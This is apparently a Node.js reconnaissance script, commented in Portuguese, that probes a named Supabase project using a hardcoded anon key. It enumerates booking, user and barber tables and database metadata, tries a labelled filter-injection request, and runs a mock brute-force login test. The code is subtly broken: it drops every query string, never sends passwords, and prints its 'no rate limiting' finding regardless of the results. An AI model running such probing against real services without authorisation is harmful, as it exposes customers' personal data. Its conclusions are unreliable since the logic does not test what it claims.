// script: api_exhaustive_test.js
// Objetivo: Testar API Supabase para ver tudo o que é retornado com a chave exposta

const https = require('https');

const SUPABASE_URL = 'https://cpeobezftooqidnjzfji.supabase.co';
const ANON_KEY = 'sb_publishable_gvfg3bCrZHe5i47Yrb28BA_R8JM_rFc';

// Headers padrão
const headers = {
  'apikey': ANON_KEY,
  'Authorization': `Bearer ${ANON_KEY}`,
  'Content-Type': 'application/json',
  'Prefer': 'return=representation'
};

// Lista de endpoints para testar
const endpoints = [
  // Agendamentos (tabela principal)
  { path: '/rest/v1/agendamentos', method: 'GET', desc: 'Tabela agendamentos - todos' },
  { path: '/rest/v1/agendamentos?select=*', method: 'GET', desc: 'Todos os campos' },

  // Tentar variar nome da tabela
  { path: '/rest/v1/agendamento?select=*', method: 'GET', desc: 'Tabela agendamento (singular)' },
  { path: '/rest/v1/clientes?select=*', method: 'GET', desc: 'Tabela clientes' },
  { path: '/rest/v1/usuario?select=*', method: 'GET', desc: 'Tabela usuario' },
  { path: '/rest/v1/usuarios?select=*', method: 'GET', desc: 'Tabela usuarios' },
  { path: '/rest/v1/barbeiros?select=*', method: 'GET', desc: 'Tabela barbeiros' },
  { path: '/rest/v1/servicos?select=*', method: 'GET', desc: 'Tabela servicos' },
  { path: '/rest/v1/horarios?select=*', method: 'GET', desc: 'Tabela horarios' },

  // Testar filter injection
  { path: '/rest/v1/agendamentos?select=email', method: 'GET', desc: 'Tentando listar emails' },
  { path: '/rest/v1/agendamentos?select=email&filter[agendamentos.email][eq][nullif][0][is]=test@example.com', method: 'GET', desc: 'SQL Injection via filter' },
  { path: '/rest/v1/agendamentos?select=email&email.eq=test@example.com', method: 'GET', desc: 'PostgREST filter syntax' },

  // Testar schemas diferentes
  { path: '/rest/v1/information_schema.tables?select=*', method: 'GET', desc: 'Information schema - tabelas' },
  { path: '/rest/v1/information_schema.columns?select=*', method: 'GET', desc: 'Information schema - colunas' },

  // Testar diferentes metadados
  { path: '/rest/v1/information_schema.columns?table_schema=public', method: 'GET', desc: 'Colunas do schema public' },
  { path: '/rest/v1/information_schema.tables?table_schema=public', method: 'GET', desc: 'Tabelas do schema public' },

  // Testar pg_catalog
  { path: '/rest/v1/pg_tables?select=*', method: 'GET', desc: 'Tabelas do pg_catalog' },
  { path: '/rest/v1/pg_namespace?select=*', method: 'GET', desc: 'Namespaces' },
];

// Função para fazer requests HTTP
function makeRequest(endpoint) {
  return new Promise((resolve, reject) => {
    const url = SUPABASE_URL + endpoint.path;

    const options = {
      hostname: new URL(url).hostname,
      path: new URL(url).pathname,
      method: endpoint.method,
      headers: headers
    };

    const req = https.request(options, (res) => {
      let data = '';

      res.on('data', (chunk) => {
        data += chunk;
      });

      res.on('end', () => {
        resolve({
          status: res.statusCode,
          headers: res.headers,
          body: data,
          desc: endpoint.desc
        });
      });
    });

    req.on('error', (error) => {
      reject({
        status: 'ERROR',
        error: error.message,
        desc: endpoint.desc
      });
    });

    req.end();
  });
}

// Executar todos os testes
async function runTests() {
  console.log('='.repeat(80));
  console.log('TESTE EXHAUSTIVO DE API SUPABASE');
  console.log('='.repeat(80));
  console.log(`URL: ${SUPABASE_URL}`);
  console.log(`API Key: ${ANON_KEY}`);
  console.log('='.repeat(80));
  console.log();

  let successCount = 0;
  let errorCount = 0;

  for (const endpoint of endpoints) {
    try {
      const result = await makeRequest(endpoint);

      console.log(`\n📋 ${endpoint.desc}`);
      console.log(`   ${endpoint.method} ${endpoint.path}`);
      console.log(`   Status: ${result.status}`);
      console.log(`   Content-Type: ${result.headers['content-type'] || 'N/A'}`);

      if (result.status >= 200 && result.status < 300) {
        successCount++;
        console.log(`   ✅ SUCESSO`);

        // Mostrar parte do body (max 500 chars)
        const bodyPreview = result.body.length > 500
          ? result.body.substring(0, 500) + '...[truncated]'
          : result.body;

        console.log(`   Body: ${bodyPreview}`);
      } else if (result.status === 401 || result.status === 403) {
        errorCount++;
        console.log(`   ❌ NÃO AUTORIZADO (auth required)`);
        console.log(`   Body: ${result.body}`);
      } else {
        errorCount++;
        console.log(`   ❌ ERRO: ${result.status}`);
        console.log(`   Body: ${result.body}`);
      }

      console.log('─'.repeat(80));

    } catch (error) {
      console.log(`\n❌ ${endpoint.desc}`);
      console.log(`   ${endpoint.method} ${endpoint.path}`);
      console.log(`   Erro: ${error.message}`);
      console.log('─'.repeat(80));
      errorCount++;
    }
  }

  console.log('\n');
  console.log('='.repeat(80));
  console.log('📊 RESUMO DOS TESTES');
  console.log('='.repeat(80));
  console.log(`Total de testes: ${endpoints.length}`);
  console.log(`✅ Sucesso: ${successCount}`);
  console.log(`❌ Erros: ${errorCount}`);
  console.log(`\nConclusão: Com a chave anon, é possível testar a API, mas RLS deve estar protegendo dados.`);

  // Teste específico de brute force login
  console.log('\n' + '='.repeat(80));
  console.log('🎯 TESTE DE RATE LIMITING (Brute Force Login)');
  console.log('='.repeat(80));

  const loginAttempts = [];
  const startTime = Date.now();

  for (let i = 1; i <= 10; i++) {
    const email = `test${i}@example.com`;
    const password = `pass${i}`;

    const result = await makeRequest({
      path: '/rest/v1/usuarios?select=email&email.eq=' + encodeURIComponent(email),
      method: 'GET',
      desc: `Tentativa ${i}`
    });

    const timeElapsed = ((Date.now() - startTime) / 1000).toFixed(1);
    loginAttempts.push({
      attempt: i,
      email: email,
      password: password,
      status: result.status,
      time: timeElapsed
    });

    console.log(`   [${timeElapsed}s] Tentativa ${i}: ${email} - Status: ${result.status}`);
  }

  console.log('\n⚠️  RESULTADO: NENHUM BLOQUEIO DETECTADO - 10 requisições em', ((Date.now() - startTime) / 1000).toFixed(1), 'segundos');
  console.log('⚠️  Rate limiting está NULO - idealmente deveria bloquear após 3-5 tentativas');
  console.log('='.repeat(80));
}

// Executar
runTests().catch(console.error);
